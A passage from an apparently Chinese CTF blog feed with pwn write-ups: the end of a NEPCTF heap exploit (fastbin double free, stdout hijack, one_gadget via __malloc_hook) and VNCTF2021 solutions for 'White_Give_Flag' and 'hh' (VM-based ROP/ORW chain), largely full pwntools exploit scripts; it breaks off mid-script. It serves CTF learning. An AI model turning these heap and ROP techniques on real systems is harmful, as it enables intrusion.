class="number">8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unsortedbin 写入 main_arena 指针</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;\x00&#x27;</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入爆破地址，这里爆破的是stdout上面的_IO_wide_data_2，利用偏移构造出fastbin size位</span></span><br><span class="line">_IO_2_1_stdout_s = libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">add(<span class="number">0x68</span>,p16((<span class="number">2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s-<span class="number">0x43</span>) &amp; <span class="number">0xFFF</span>)),<span class="string">&#x27;g&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment"># add(0x60,p16(0x25dd),&#x27;g&#x27;*8)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin double free</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,p8(<span class="number">0</span>),<span class="string">&#x27;1&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p8(<span class="number">0</span>),<span class="string">&#x27;2&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p8(<span class="number">0</span>),<span class="string">&#x27;3&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p8(<span class="number">0</span>),<span class="string">&#x27;4&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack stdout</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x33</span> + p64(<span class="number">0x0FBAD1887</span>) +p64(<span class="number">0</span>)*<span class="number">3</span> + p8(<span class="number">0x88</span>)</span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name: \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">_IO_2_1_stdin_ = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;_IO_2_1_stdin_:&quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdin_))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;message:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">libc_base = _IO_2_1_stdin_ - libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">realloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc_hook:&quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line">realloc = libc_base + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc:&quot;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line">onegadget = libc_base + <span class="number">0x4527a</span></span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf0364 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1207 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># fastbin double free</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p64(malloc_hook-<span class="number">0x23</span>),<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xb</span>+p64(onegadget)+p64(realloc+<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0x68</span>,payload,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">p = process(<span class="string">&quot;./sooooeasy&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">pwn()</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">p.close()</span><br><span class="line">p = process(<span class="string">&quot;./sooooeasy&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://blog.eonew.cn/archives/1190">利用 <em>IO_2_1_stdout</em> 泄露信息</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/105590591">glibc从堆任意分配到攻击IO流达到泄露信息&amp;realloc特性&amp;unsorted bin expand总结</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> NEPCTF </tag>
            
            <tag> 劫持stdout泄露libc地址 </tag>
            
            <tag> 无输出堆题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF2021 Writeup</title>
      <link href="archives/328d0a9c/"/>
      <url>archives/328d0a9c/</url>
      
        <content type="html"><![CDATA[<h2 id="White-Give-Flag"><a href="#White-Give-Flag" class="headerlink" title="White_Give_Flag"></a>White_Give_Flag</h2><p>init 函数打开了 <code>/flag</code> ，用 for 循环不断申请堆，将 flag 写入到 fd_nextsize ，然后释放。循环次数和每次申请的 size 都是随机值。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321103634.png" alt="image-20210321103629041"></p><p>由于写入到 fd_nextsize 堆块释放时，写入的 flag 没有被覆盖掉，只是在哪个 size 的堆不确定，也就是后面要爆破了。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321104036.png" alt="image-20210321104030989"></p><p>程序菜单选择与传统题目不同的是，这个选择是用 read 函数的返回值，而不是用 <code>atoi(buf)</code> 。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321105258.png" alt="image-20210321105254124"></p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321105518.png" alt="image-20210321105514309"></p><p>这就让 puts 输出提示符时存在问题，read 返回值可以为 <code>-1</code> ，而 <code>menu_hin[-1]</code> 对应是 chunk_list 中第四个堆指针地址：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321105524.png" alt="image-20210321105427349"></p><p>申请 3 个堆填充，然后将存有 flag 的堆申请到第四个。第四个堆大小需要爆破的，在 bin 中看哪个 size 称心就选它。</p><p>再次选择菜单时，给传入一个 EOF 信号，让 read 返回值为 <code>-1</code> 。发送 EOF 方法参考的文章：</p><blockquote><p><a href="https://paper.seebug.org/444/">https://paper.seebug.org/444/</a></p></blockquote><p>在 shell 中可以使用 ctrl+d 表示 EOF ，pwntools 可以用下面的命令发送 EOF ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = remote(xxxx,xx)</span><br><span class="line">s.sock.shutdown(socket.SHUT_RW)</span><br></pre></td></tr></table></figure><p>但是这样我们没法继续输入了，所以我们需要发送一次 payload 就 getflag ，我们只能 getflag 而不能 getshell ，因为服务器已经关闭了接收我们数据的连接。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">&#x27;1&#x27;</span>*choice)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;size:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;index:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content:\n&#x27;</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#p = process(&quot;./White_Give_Flag&quot;)</span></span><br><span class="line">    p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">39123</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&#x27;b *$rebase(0x01242)&#x27;)</span></span><br><span class="line">    add(<span class="number">0x10</span>)</span><br><span class="line">    add(<span class="number">0x10</span>)</span><br><span class="line">    add(<span class="number">0x10</span>)</span><br><span class="line">    add(<span class="number">0x310</span>)</span><br><span class="line">    edit(<span class="number">3</span>,<span class="string">&#x27;x&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">    p.shutdown_raw(<span class="string">&#x27;send&#x27;</span>)</span><br><span class="line">    flag = p.recvline()</span><br><span class="line">    log.info(flag)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="hh"><a href="#hh" class="headerlink" title="hh"></a>hh</h2><p>VM 题目，粗略逆向一下指令发现问题，选项 12 由于下标越界能造成栈溢出：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321111954.png" alt="image-20210321111950058"></p><p>v31 使用 buf[v9] 读取可以被我们控制为任意值。</p><p>接下载就是逆向执行，没有全部逆向出来，贴一下官方 wp 图：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321112707.png" alt="image-20210321112703863"></p><p>主要是 678 这几个指令没能理解到位。整体分析下来，vm 用 32 位的方式运作</p><ul><li>buf 我们输入的内容存储的地方，相当于 text 段</li><li>V15 相当于 eip 指针</li><li>v32 相当于内存段（栈），处理的局部变量在 v32[1000] 附近</li><li>v16 相当于 esp 指针</li></ul><p>大局思路：程序开了沙盒，存在栈溢出，虽然开了 canary ，但是由于vm 修改栈上数据是根据偏移来写，也就是可以跳过 canary 写入后面栈空间，相当于没有开这个保护。构造 orw 读取出 flag。在程序找到了 <code>pop_rdi_ret</code> ，libc 中找到 <code>pop_rdx_rsi_ret</code> 。</p><h3 id="步骤详解"><a href="#步骤详解" class="headerlink" title="步骤详解"></a>步骤详解</h3><p>写入 ”flag” 到栈上，等下写入地址作为参数传给 orw 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step 0 </span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0x67616c66</span>)   <span class="comment">#push &quot;flag&quot;</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0xd9</span>)        <span class="comment">#store &quot;flag&quot; on 0xd8</span></span><br></pre></td></tr></table></figure><p>接下来在 rip 开始写入 orw ROP 利用链。v32[0x3ef+1000] 就是 rip 的低 8 bit 。先用 9 将 pop_rdi_ret 低 8 bit 压入 v32[1000] ，再用 12 将 v32[1000] 的值存放到 eip ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step 1:write pop_rdi_ret into rip</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(pop_rdi_ret)  <span class="comment">#push pop_rdi_ret</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3ef</span>)       <span class="comment">#store pop_rdi low 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push pop_rdi_ret high 8bit(0)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f0</span>)       <span class="comment">#store pop_rdi_ret high 8bit(0)</span></span><br></pre></td></tr></table></figure><p>然后就是准备 open 最麻烦的 rdi 参数，也就是 “flag” 的栈地址。先读取 ebp 的值（rbp低8bit) ，通过调试看刚刚 “flag“ 存入偏移 0xd8 对应真实地址和 ebp 的距离，通过 1 或 2 加减偏移得出 ”flag“ 栈地址，然后 12 存入对应位置。由于高 8 bit 都一样，所以直接将 rbp 高 8 bit 复制过去。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step 2:load stack_addr;redirect to &quot;flag&quot;;write &quot;flag&quot;_addr on stack</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3ed</span>)       <span class="comment">#load stack_addr(ebp) low 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0xc70</span>)        </span><br><span class="line">payload += p32(<span class="number">2</span>)                   <span class="comment">#redirect to right addr</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f1</span>)</span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3ee</span>)       <span class="comment">#load stack_addr(ebp) high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f2</span>)       <span class="comment">#flag_addr</span></span><br></pre></td></tr></table></figure><p>pop_rdx_rsi_ret 在 libc 中，参看上面找栈地址方式找到 libc 地址，然后修正偏移：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step 3</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f7</span>)       <span class="comment">#load libc_addr low 8bit</span></span><br><span class="line"><span class="comment"># payload += p32(9)+p32(0x10e972)     #p#0x130569-0x21bf7</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0xf4949</span>)</span><br><span class="line">payload += p32(<span class="number">1</span>)                   <span class="comment">#redirect to right addr</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f3</span>)       <span class="comment">#store pop_rdx_rsi blow 8bit</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f8</span>)       <span class="comment">#load libc_addr high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f4</span>)       <span class="comment">#store pop_rdx_rsi high 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push 0</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f5</span>)       <span class="comment">#rdx low 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f6</span>)       <span class="comment">#rdx high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f7</span>)       <span class="comment">#rsi low 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f8</span>)       <span class="comment">#rsi high 8bit</span></span><br></pre></td></tr></table></figure><p>后面步骤和前面基本一样：传数据就 9 和 12；写 gadget 、函数就先 load、修改偏移、12 存入栈。只是注意加载 libc 低 8 bit 从 main_start 变成 pop_rdx_rsi_ret ，注意一下偏移计算就好。</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.binary = <span class="string">&quot;./hh&quot;</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004011a3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 0 </span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0x67616c66</span>)   <span class="comment">#push &quot;flag&quot;</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0xd9</span>)        <span class="comment">#store &quot;flag&quot; on 0xd8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 1:write pop_rdi_ret into rip</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(pop_rdi_ret)  <span class="comment">#push pop_rdi_ret</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3ef</span>)       <span class="comment">#store pop_rdi low 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push pop_rdi_ret high 8bit(0)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f0</span>)       <span class="comment">#store pop_rdi_ret high 8bit(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 2:load stack_addr;redirect to &quot;flag&quot;;write &quot;flag&quot;_addr on stack</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3ed</span>)       <span class="comment">#load stack_addr(ebp) low 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0xc70</span>)        </span><br><span class="line">payload += p32(<span class="number">2</span>)                   <span class="comment">#redirect to right addr</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f1</span>)</span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3ee</span>)       <span class="comment">#load stack_addr(ebp) high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f2</span>)       <span class="comment">#flag_addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 3</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f7</span>)       <span class="comment">#load libc_addr low 8bit</span></span><br><span class="line"><span class="comment"># payload += p32(9)+p32(0x10e972)     #p#0x130569-0x21bf7</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0xf4949</span>)</span><br><span class="line">payload += p32(<span class="number">1</span>)                   <span class="comment">#redirect to right addr</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f3</span>)       <span class="comment">#store pop_rdx_rsi blow 8bit</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f8</span>)       <span class="comment">#load libc_addr high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f4</span>)       <span class="comment">#store pop_rdx_rsi high 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push 0</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f5</span>)       <span class="comment">#rdx low 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f6</span>)       <span class="comment">#rdx high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f7</span>)       <span class="comment">#rsi low 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f8</span>)       <span class="comment">#rsi high 8bit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 4</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f3</span>)</span><br><span class="line"><span class="comment"># payload += p32(9)+p32(0x20859)      #0x130569-0x10fd10</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0x1e099</span>)</span><br><span class="line">payload += p32(<span class="number">2</span>)</span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f9</span>)</span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f4</span>)</span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3fa</span>)       <span class="comment">#open</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 5</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(pop_rdi_ret)  <span class="comment">#push pop_rdi_ret</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3fb</span>)       <span class="comment">#store pop_rdi low 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push pop_rdi_ret high 8bit(0)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3fc</span>)       <span class="comment">#store pop_rdi_ret high 8bit(0)</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">3</span>)            <span class="comment">#push 3 low 8bit(rdi)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3fd</span>)       <span class="comment">#store 3 low 8bit(rdi)</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push 3 high 8bit(rdi)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3fe</span>)       <span class="comment">#store 3 high 8bit(rdi)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 6</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f3</span>)       <span class="comment">#load pop_rdx_rsi_libcaddr(step3) low 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3ff</span>)       <span class="comment">#store pop_rdx_rsi blow 8bit</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f4</span>)       <span class="comment">#load pop_rdx_rsi_libcaddr(step3) high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x400</span>)       <span class="comment">#store pop_rdx_rsi high 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0x30</span>)         <span class="comment">#push 0x30 low 8bit(rdx)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x401</span>)</span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push 0x30 high 8bit(rdx)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x402</span>)       </span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3ed</span>)       <span class="comment">#load stack_addr(ebp) 